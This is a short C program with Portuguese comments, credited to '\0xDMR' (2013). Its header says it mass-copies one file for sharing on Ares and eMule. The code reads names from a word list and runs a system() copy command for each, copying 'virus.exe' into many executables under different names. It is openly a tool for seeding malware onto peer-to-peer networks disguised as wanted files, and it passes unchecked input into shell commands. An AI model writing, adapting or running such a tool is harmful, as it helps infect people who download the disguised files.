/*
	Faz copia de um unico arquivo em massa, para compartilhar no ares, emule, etc...
	
	By: \0xDMR - Jan 2013
*/
#include <stdio.h>

int
main(int argc, char *argv[])
{
	char cPalavraTemp[200], cPalavra[200];
	int x, y, len;
	FILE *arquivo;
	
	arquivo = fopen("lista.txt", "r");
	
	// le palavra
	while (fgets(cPalavra,sizeof(cPalavra),arquivo)!=NULL){
		sprintf(cPalavraTemp, "copy \"virus.exe\" \"saida\\%sexe\"", cPalavra);
			
		// remove \n
		len = strlen(cPalavraTemp);			
		if(cPalavraTemp[strlen(cPalavraTemp) - 5] == '\n'){
			cPalavraTemp[len - 5] = '.';
			
		}
		
		// renomeia arquivo
		printf("Log: CMD: %s \n", cPalavraTemp);
		system(cPalavraTemp);
		}

	return 0;
}